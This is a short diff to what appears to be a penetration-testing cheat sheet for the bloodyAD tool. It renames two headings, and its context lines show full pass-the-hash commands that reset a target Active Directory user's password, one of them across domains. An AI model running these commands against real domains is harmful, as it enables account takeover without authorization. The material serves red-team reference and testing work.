@@ -28,13 +28,13 @@
 bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p
 ```
 
-## set - change user password (pth)
+## set - reset password (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
 bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
 ```
 
-## set cross-domain - change user password (pth)
+## set cross-domain - reset user password (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
 bloodyad --host <target_dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
